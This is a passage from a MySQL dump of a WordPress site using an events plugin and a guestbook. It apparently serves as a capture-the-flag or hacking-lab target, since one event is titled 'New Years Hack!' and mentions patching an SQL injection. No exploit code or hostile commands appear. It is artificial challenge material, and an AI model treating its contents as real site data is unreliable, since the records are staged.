cp_task_signup_pending_email_body_tpl\";i:0;s:37:\"task_signup_updated_email_subject_tpl\";i:0;s:34:\"task_signup_updated_email_body_tpl\";i:0;s:39:\"task_signup_cancelled_email_subject_tpl\";i:0;s:36:\"task_signup_cancelled_email_body_tpl\";i:0;s:42:\"cp_task_signup_cancelled_email_subject_tpl\";i:0;s:39:\"cp_task_signup_cancelled_email_body_tpl\";i:0;s:37:\"task_signup_trashed_email_subject_tpl\";i:0;s:34:\"task_signup_trashed_email_body_tpl\";i:0;s:27:\"task_signup_form_format_tpl\";i:0;s:32:\"task_signup_recorded_ok_html_tpl\";i:0;s:38:\"task_signup_reminder_email_subject_tpl\";i:0;s:35:\"task_signup_reminder_email_body_tpl\";i:0;s:45:\"event_registration_reminder_email_subject_tpl\";i:0;s:42:\"event_registration_reminder_email_body_tpl\";i:0;s:53:\"event_registration_pending_reminder_email_subject_tpl\";i:0;s:50:\"event_registration_pending_reminder_email_body_tpl\";i:0;s:33:\"event_contactperson_email_subject\";s:0:\"\";s:30:\"event_respondent_email_subject\";s:0:\"\";s:40:\"event_registration_pending_email_subject\";s:0:\"\";s:44:\"event_registration_userpending_email_subject\";s:0:\"\";s:41:\"event_registration_userpending_email_body\";s:0:\"\";s:40:\"event_registration_updated_email_subject\";s:0:\"\";s:42:\"event_registration_cancelled_email_subject\";s:0:\"\";s:37:\"event_registration_paid_email_subject\";s:0:\"\";s:40:\"event_registration_trashed_email_subject\";s:0:\"\";s:45:\"contactperson_registration_pending_email_body\";s:0:\"\";s:47:\"contactperson_registration_cancelled_email_body\";s:0:\"\";s:41:\"contactperson_registration_ipn_email_body\";s:0:\"\";s:48:\"contactperson_registration_pending_email_subject\";s:0:\"\";s:50:\"contactperson_registration_cancelled_email_subject\";s:0:\"\";s:44:\"contactperson_registration_ipn_email_subject\";s:0:\"\";s:45:\"contactperson_registration_paid_email_subject\";s:0:\"\";s:42:\"contactperson_registration_paid_email_body\";s:0:\"\";s:29:\"attendance_unauth_scan_format\";s:0:\"\";s:27:\"attendance_auth_scan_format\";s:0:\"\";s:41:\"event_registration_reminder_email_subject\";s:0:\"\";s:38:\"event_registration_reminder_email_body\";s:0:\"\";s:49:\"event_registration_pending_reminder_email_subject\";s:0:\"\";s:46:\"event_registration_pending_reminder_email_body\";s:0:\"\";}', '', '', '', '', '', '', '', '', '', '', '', '', 0, 0, '', 0, ''),
(4, 1, 1, 'New Years Hack!', '', 'new-years-hack', '', '2022-12-31 00:00:00', '2023-01-01 23:59:59', '2022-10-28 14:53:48', '2022-10-28 14:53:48', 'Okay, we updated the plugiin, so no more SQLi!', 0, 0, '0', 'EUR', 0, 0, '10', -1, 0, 0, '', 'a:0:{}', 'a:138:{s:14:\"create_wp_user\";i:0;s:12:\"auto_approve\";i:0;s:14:\"ignore_pending\";i:0;s:15:\"email_only_once\";i:0;s:16:\"person_only_once\";i:0;s:11:\"invite_only\";i:0;s:7:\"all_day\";s:1:\"1\";s:15:\"take_attendance\";i:0;s:25:\"require_user_confirmation\";s:1:\"0\";s:11:\"min_allowed\";s:1:\"1\";s:11:\"max_allowed\";s:2:\"10\";s:22:\"rsvp_start_number_days\";s:0:\"\";s:23:\"rsvp_start_number_hours\";s:0:\"\";s:17:\"rsvp_start_target\";s:5:\"start\";s:15:\"rsvp_end_target\";s:5:\"start\";s:13:\"rsvp_discount\";s:0:\"\";s:17:\"waitinglist_seats\";i:0;s:18:\"check_free_waiting\";s:1:\"0\";s:18:\"rsvp_discountgroup\";s:0:\"\";s:21:\"rsvp_addpersontogroup\";a:0:{}s:13:\"rsvp_password\";s:0:\"\";s:10:\"use_paypal\";i:0;s:16:\"use_legacypaypal\";i:0;s:7:\"use_2co\";i:0;s:12:\"use_webmoney\";i:0;s:8:\"use_fdgg\";i:0;s:10:\"use_mollie\";i:0;s:12:\"use_payconiq\";i:0;s:12:\"use_worldpay\";i:0;s:10:\"use_stripe\";i:0;s:13:\"use_braintree\";i:0;s:13:\"use_instamojo\";i:0;s:15:\"use_mercadopago\";i:0;s:9:\"use_fondy\";i:0;s:11:\"use_offline\";i:0;s:16:\"cancel_rsvp_days\";s:1:\"0\";s:15:\"cancel_rsvp_age\";s:1:\"0\";s:16:\"attendance_begin\";s:1:\"5\";s:14:\"attendance_end\";s:1:\"0\";s:18:\"ticket_template_id\";s:0:\"\";s:11:\"ticket_mail\";s:8:\"approval\";s:16:\"wp_page_template\";s:0:\"\";s:12:\"use_hcaptcha\";i:0;s:13:\"use_recaptcha\";i:0;s:11:\"use_captcha\";i:0;s:18:\"dyndata_all_fields\";i:0;s:18:\"booking_attach_ids\";s:0:\"\";s:18:\"pending_attach_ids\";s:0:\"\";s:15:\"paid_attach_ids\";s:0:\"\";s:15:\"multiprice_desc\";s:0:\"\";s:10:\"price_desc\";s:0:\"\";s:16:\"attendancerecord\";i:0;s:18:\"skippaymentoptions\";i:0;s:7:\"vat_pct\";s:1:\"0\";s:26:\"task_registered_users_only\";s:1:\"0\";s:21:\"task_require_approval\";b:0;s:18:\"task_allow_overlap\";s:1:\"0\";s:18:\"task_reminder_days\";s:0:\"\";s:26:\"rsvp_pending_reminder_days\";s:0:\"\";s:27:\"rsvp_approved_reminder_days\";s:0:\"\";s:27:\"event_page_title_format_tpl\";s:1:\"0\";s:29:\"event_single_event_format_tpl\";s:1:\"0\";s:34:\"event_contactperson_email_body_tpl\";s:1:\"0\";s:39:\"event_registration_recorded_ok_html_tpl\";s:1:\"0\";s:31:\"event_respondent_email_body_tpl\";s:1:\"0\";s:41:\"event_registration_pending_email_body_tpl\";s:1:\"0\";s:45:\"event_registration_userpending_email_body_tpl\";s:1:\"0\";s:41:\"event_registration_updated_email_body_tpl\";s:1:\"0\";s:43:\"event_registration_cancelled_email_body_tpl\";s:1:\"0\";s:41:\"event_registration_trashed_email_body_tpl\";s:1:\"0\";s:34:\"event_registration_form_format_tpl\";s:1:\"0\";s:28:\"event_cancel_form_format_tpl\";s:1:\"0\";s:38:\"event_registration_paid_email_body_tpl\";s:1:\"0\";s:37:\"event_contactperson_email_subject_tpl\";s:1:\"0\";s:34:\"event_respondent_email_subject_tpl\";s:1:\"0\";s:44:\"event_registration_pending_email_subject_tpl\";s:1:\"0\";s:48:\"event_registration_userpending_email_subject_tpl\";s:1:\"0\";s:44:\"event_registration_updated_email_subject_tpl\";s:1:\"0\";s:46:\"event_registration_cancelled_email_subject_tpl\";s:1:\"0\";s:44:\"event_registration_trashed_email_subject_tpl\";s:1:\"0\";s:41:\"event_registration_paid_email_subject_tpl\";s:1:\"0\";s:52:\"contactperson_registration_pending_email_subject_tpl\";s:1:\"0\";s:49:\"contactperson_registration_pending_email_body_tpl\";s:1:\"0\";s:54:\"contactperson_registration_cancelled_email_subject_tpl\";s:1:\"0\";s:51:\"contactperson_registration_cancelled_email_body_tpl\";s:1:\"0\";s:48:\"contactperson_registration_ipn_email_subject_tpl\";s:1:\"0\";s:45:\"contactperson_registration_ipn_email_body_tpl\";s:1:\"0\";s:49:\"contactperson_registration_paid_email_subject_tpl\";s:1:\"0\";s:46:\"contactperson_registration_paid_email_body_tpl\";s:1:\"0\";s:26:\"attendance_unauth_scan_tpl\";s:1:\"0\";s:24:\"attendance_auth_scan_tpl\";s:1:\"0\";s:29:\"task_signup_email_subject_tpl\";i:0;s:26:\"task_signup_email_body_tpl\";i:0;s:32:\"cp_task_signup_email_subject_tpl\";i:0;s:29:\"cp_task_signup_email_body_tpl\";i:0;s:37:\"task_signup_pending_email_subject_tpl\";i:0;s:34:\"task_signup_pending_email_body_tpl\";i:0;s:40:\"cp_task_signup_pending_email_subject_tpl\";i:0;s:37:\"cp_task_signup_pending_email_body_tpl\";i:0;s:37:\"task_signup_updated_email_subject_tpl\";i:0;s:34:\"task_signup_updated_email_body_tpl\";i:0;s:39:\"task_signup_cancelled_email_subject_tpl\";i:0;s:36:\"task_signup_cancelled_email_body_tpl\";i:0;s:42:\"cp_task_signup_cancelled_email_subject_tpl\";i:0;s:39:\"cp_task_signup_cancelled_email_body_tpl\";i:0;s:37:\"task_signup_trashed_email_subject_tpl\";i:0;s:34:\"task_signup_trashed_email_body_tpl\";i:0;s:27:\"task_signup_form_format_tpl\";i:0;s:32:\"task_signup_recorded_ok_html_tpl\";i:0;s:38:\"task_signup_reminder_email_subject_tpl\";i:0;s:35:\"task_signup_reminder_email_body_tpl\";i:0;s:45:\"event_registration_reminder_email_subject_tpl\";s:1:\"0\";s:42:\"event_registration_reminder_email_body_tpl\";s:1:\"0\";s:53:\"event_registration_pending_reminder_email_subject_tpl\";s:1:\"0\";s:50:\"event_registration_pending_reminder_email_body_tpl\";s:1:\"0\";s:33:\"event_contactperson_email_subject\";s:0:\"\";s:30:\"event_respondent_email_subject\";s:0:\"\";s:40:\"event_registration_pending_email_subject\";s:0:\"\";s:44:\"event_registration_userpending_email_subject\";s:0:\"\";s:41:\"event_registration_userpending_email_body\";s:0:\"\";s:40:\"event_registration_updated_email_subject\";s:0:\"\";s:42:\"event_registration_cancelled_email_subject\";s:0:\"\";s:37:\"event_registration_paid_email_subject\";s:0:\"\";s:40:\"event_registration_trashed_email_subject\";s:0:\"\";s:45:\"contactperson_registration_pending_email_body\";s:0:\"\";s:47:\"contactperson_registration_cancelled_email_body\";s:0:\"\";s:41:\"contactperson_registration_ipn_email_body\";s:0:\"\";s:48:\"contactperson_registration_pending_email_subject\";s:0:\"\";s:50:\"contactperson_registration_cancelled_email_subject\";s:0:\"\";s:44:\"contactperson_registration_ipn_email_subject\";s:0:\"\";s:45:\"contactperson_registration_paid_email_subject\";s:0:\"\";s:42:\"contactperson_registration_paid_email_body\";s:0:\"\";s:29:\"attendance_unauth_scan_format\";s:0:\"\";s:27:\"attendance_auth_scan_format\";s:0:\"\";s:41:\"event_registration_reminder_email_subject\";s:0:\"\";s:38:\"event_registration_reminder_email_body\";s:0:\"\";s:49:\"event_registration_pending_reminder_email_subject\";s:0:\"\";s:46:\"event_registration_pending_reminder_email_body\";s:0:\"\";}', '', '', '', '', '', '', '', '', '', '', '', '', 0, 0, '', 0, '');

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_formfields`
--

CREATE TABLE `wp_eme_formfields` (
  `field_id` int(11) NOT NULL,
  `field_type` tinytext COLLATE utf8mb4_unicode_ci NOT NULL,
  `field_name` tinytext COLLATE utf8mb4_unicode_ci NOT NULL,
  `field_values` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `admin_values` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `field_tags` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `admin_tags` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `field_attributes` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `field_purpose` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `field_condition` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `field_required` tinyint(1) DEFAULT 0,
  `export` tinyint(1) DEFAULT 0,
  `extra_charge` tinyint(1) DEFAULT 0,
  `searchable` tinyint(1) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_groups`
--

CREATE TABLE `wp_eme_groups` (
  `group_id` int(11) NOT NULL,
  `name` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `type` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `public` tinyint(1) DEFAULT 0,
  `stored_sql` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `search_terms` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_holidays`
--

CREATE TABLE `wp_eme_holidays` (
  `id` int(11) NOT NULL,
  `name` tinytext COLLATE utf8mb4_unicode_ci NOT NULL,
  `list` text COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_locations`
--

CREATE TABLE `wp_eme_locations` (
  `location_id` mediumint(9) NOT NULL,
  `location_name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `location_prefix` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_slug` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_url` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_address1` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_address2` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_city` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_state` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_zip` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_country` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_latitude` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_longitude` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_description` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_author` mediumint(9) DEFAULT 0,
  `location_category_ids` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_image_url` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_image_id` mediumint(9) DEFAULT 0,
  `location_attributes` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_properties` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location_external_ref` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_eme_locations`
--

INSERT INTO `wp_eme_locations` (`location_id`, `location_name`, `location_prefix`, `location_slug`, `location_url`, `location_address1`, `location_address2`, `location_city`, `location_state`, `location_zip`, `location_country`, `location_latitude`, `location_longitude`, `location_description`, `location_author`, `location_category_ids`, `location_image_url`, `location_image_id`, `location_attributes`, `location_properties`, `location_external_ref`) VALUES
(1, 'Arts Millenium Building', NULL, NULL, NULL, 'Newcastle Road', NULL, 'Galway', NULL, NULL, NULL, '53.275', '-9.06532', NULL, 0, NULL, NULL, 0, NULL, NULL, NULL),
(2, 'The Crane Bar', NULL, NULL, NULL, '2, Sea Road', NULL, 'Galway', NULL, NULL, NULL, '53.2683224', '-9.0626223', NULL, 0, NULL, NULL, 0, NULL, NULL, NULL),
(3, 'Taaffes Bar', NULL, NULL, NULL, '19 Shop Street', NULL, 'Galway', NULL, NULL, NULL, '53.2725', '-9.05321', NULL, 0, NULL, NULL, 0, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_mailings`
--

CREATE TABLE `wp_eme_mailings` (
  `id` int(11) NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `planned_on` datetime DEFAULT '0000-00-00 00:00:00',
  `creation_date` datetime DEFAULT NULL,
  `read_count` int(11) DEFAULT 0,
  `total_read_count` int(11) DEFAULT 0,
  `subject` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `body` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `replytoemail` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `replytoname` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `mail_text_html` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `stats` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT '',
  `conditions` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_members`
--

CREATE TABLE `wp_eme_members` (
  `member_id` int(11) NOT NULL,
  `related_member_id` int(11) DEFAULT 0,
  `membership_id` int(11) DEFAULT 0,
  `person_id` int(11) DEFAULT 0,
  `status` tinyint(4) DEFAULT 0,
  `status_automatic` tinyint(1) DEFAULT 1,
  `creation_date` datetime DEFAULT NULL,
  `modif_date` datetime DEFAULT NULL,
  `last_seen` datetime DEFAULT '0000-00-00 00:00:00',
  `start_date` date NOT NULL DEFAULT '0000-00-00',
  `end_date` date NOT NULL DEFAULT '0000-00-00',
  `reminder` int(11) DEFAULT 0,
  `reminder_date` datetime DEFAULT '0000-00-00 00:00:00',
  `renewal_count` int(11) DEFAULT 0,
  `transfer_nbr_be97` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `payment_id` mediumint(9) DEFAULT NULL,
  `payment_date` datetime DEFAULT '0000-00-00 00:00:00',
  `paid` tinyint(1) DEFAULT 0,
  `pg` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `pg_pid` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `extra_charge` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `discount` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `discountids` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `dcodes_entered` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `dcodes_used` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `dgroupid` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_memberships`
--

CREATE TABLE `wp_eme_memberships` (
  `membership_id` int(11) NOT NULL,
  `name` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `type` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `start_date` date DEFAULT '0000-00-00',
  `duration_count` tinyint(4) DEFAULT 0,
  `duration_period` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT '',
  `properties` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_mqueue`
--

CREATE TABLE `wp_eme_mqueue` (
  `id` int(11) NOT NULL,
  `mailing_id` int(11) DEFAULT 0,
  `person_id` int(11) DEFAULT 0,
  `member_id` int(11) DEFAULT 0,
  `status` tinyint(4) DEFAULT 0,
  `creation_date` datetime DEFAULT NULL,
  `sent_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `first_read_on` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `last_read_on` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `read_count` int(11) DEFAULT 0,
  `receiveremail` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `receivername` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `replytoemail` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `replytoname` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `subject` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `body` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `random_id` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `error_msg` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `attachments` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_payments`
--

CREATE TABLE `wp_eme_payments` (
  `id` int(11) NOT NULL,
  `creation_date` datetime DEFAULT NULL,
  `random_id` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `member_id` int(11) DEFAULT 0,
  `pg_pid` varchar(256) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `pg_handled` tinyint(1) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_people`
--

CREATE TABLE `wp_eme_people` (
  `person_id` mediumint(9) NOT NULL,
  `related_person_id` mediumint(9) DEFAULT 0,
  `lastname` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `firstname` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` tinytext COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint(4) DEFAULT 1,
  `phone` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `wp_id` bigint(20) UNSIGNED DEFAULT NULL,
  `address1` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `address2` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `city` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `zip` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `state` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `country` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `state_code` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `country_code` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `birthdate` date DEFAULT NULL,
  `bd_email` tinyint(1) DEFAULT 0,
  `birthplace` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT '',
  `lang` varchar(10) COLLATE utf8mb4_unicode_ci DEFAULT '',
  `massmail` tinyint(1) DEFAULT 0,
  `newsletter` tinyint(1) DEFAULT 0,
  `gdpr` tinyint(1) DEFAULT 0,
  `properties` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `creation_date` datetime DEFAULT NULL,
  `modif_date` datetime DEFAULT NULL,
  `gdpr_date` date DEFAULT NULL,
  `random_id` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_recurrence`
--

CREATE TABLE `wp_eme_recurrence` (
  `recurrence_id` mediumint(9) NOT NULL,
  `recurrence_start_date` date NOT NULL,
  `recurrence_end_date` date NOT NULL,
  `recurrence_interval` tinyint(4) NOT NULL,
  `recurrence_freq` tinytext COLLATE utf8mb4_unicode_ci NOT NULL,
  `recurrence_byday` tinytext COLLATE utf8mb4_unicode_ci NOT NULL,
  `recurrence_byweekno` tinyint(4) NOT NULL,
  `event_duration` mediumint(9) DEFAULT 0,
  `recurrence_specific_days` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `holidays_id` mediumint(9) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_states`
--

CREATE TABLE `wp_eme_states` (
  `id` int(11) NOT NULL,
  `code` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `name` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `country_id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_tasks`
--

CREATE TABLE `wp_eme_tasks` (
  `task_id` mediumint(9) NOT NULL,
  `event_id` mediumint(9) NOT NULL,
  `task_start` datetime DEFAULT NULL,
  `task_end` datetime DEFAULT NULL,
  `task_seq` smallint(6) DEFAULT 1,
  `task_nbr` smallint(6) DEFAULT 1,
  `name` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `spaces` smallint(6) DEFAULT 1,
  `description` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_task_signups`
--

CREATE TABLE `wp_eme_task_signups` (
  `id` int(11) NOT NULL,
  `task_id` mediumint(9) NOT NULL,
  `person_id` mediumint(9) NOT NULL,
  `event_id` mediumint(9) NOT NULL,
  `random_id` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_templates`
--

CREATE TABLE `wp_eme_templates` (
  `id` int(11) NOT NULL,
  `name` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `format` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `type` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `properties` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_usergroups`
--

CREATE TABLE `wp_eme_usergroups` (
  `person_id` int(11) DEFAULT NULL,
  `group_id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_gwolle_gb_entries`
--

CREATE TABLE `wp_gwolle_gb_entries` (
  `id` int(10) NOT NULL,
  `author_name` text NOT NULL,
  `author_id` int(5) NOT NULL DEFAULT 0,
  `author_email` text NOT NULL,
  `author_origin` text NOT NULL,
  `author_website` text NOT NULL,
  `author_ip` text NOT NULL,
  `author_host` text NOT NULL,
  `content` longtext NOT NULL,
  `datetime` bigint(8) UNSIGNED NOT NULL,
  `ischecked` tinyint(1) NOT NULL,
  `checkedby` int(5) NOT NULL,
  `istrash` varchar(1) NOT NULL DEFAULT '0',
  `isspam` varchar(1) NOT NULL DEFAULT '0',
  `admin_reply` longtext NOT NULL,
  `admin_reply_uid` int(5) NOT NULL DEFAULT 0,
  `book_id` int(5) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_gwolle_gb_entries`
--

INSERT INTO `wp_gwolle_gb_entries` (`id`, `author_name`, `author_id`, `author_email`, `author_origin`, `author_website`, `author_ip`, `author_host`, `content`, `datetime`, `ischecked`, `checkedby`, `istrash`, `isspam`, `admin_reply`, `admin_reply_uid`, `book_id`) VALUES
(1, 'horseLeader5', 0, '', '', '', '', '', 'Is it true Troy Hunt hacked MyDeal?? Very interested in this...', 1666534292, 1, 0, '0', '0', '', 0, 1);

-- --------------------------------------------------------

--
-- Table structure for table `wp_gwolle_gb_log`
--

CREATE TABLE `wp_gwolle_gb_log` (
  `id` int(8) NOT NULL,
  `subject` text NOT NULL,
  `entry_id` int(5) NOT NULL,
  `author_id` int(5) NOT NULL,
  `datetime` bigint(8) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_gwolle_gb_log`
--

INSERT INTO `wp_gwolle_gb_log` (`id`, `subject`, `entry_id`, `author_id`, `datetime`) VALUES
(1, 'entry-edited', 1, 1, 1666534525);

-- --------------------------------------------------------

--
-- Table structure for table `wp_limit_login`
--

CREATE TABLE `wp_limit_login` (
  `login_id` int(11) NOT NULL,
  `login_ip` varchar(50) NOT NULL,
  `login_attempts` int(11) NOT NULL,
  `attempt_time` datetime DEFAULT NULL,
  `locked_time` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `wp_limit_login`
--

INSERT INTO `wp_limit_login` (`login_id`, `login_ip`, `login_attempts`, `attempt_time`, `locked_time`) VALUES
(1, '122c4a55d1a70cef972cac3982dd49a6', 0, '2022-10-24 13:55:03', '0');

-- --------------------------------------------------------

--
-- Table structure for table `wp_links`
--

CREATE TABLE `wp_links` (
  `link_id` bigint(20) UNSIGNED NOT NULL,
  `link_url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_image` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_target` varchar(25) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_description` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_visible` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'Y',
  `link_owner` bigint(20) UNSIGNED NOT NULL DEFAULT 1,
  `link_rating` int(11) NOT NULL DEFAULT 0,
  `link_updated` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `link_rel` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_notes` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `link_rss` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT ''
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_options`
--

CREATE TABLE `wp_options` (
  `option_id` bigint(20) UNSIGNED NOT NULL,
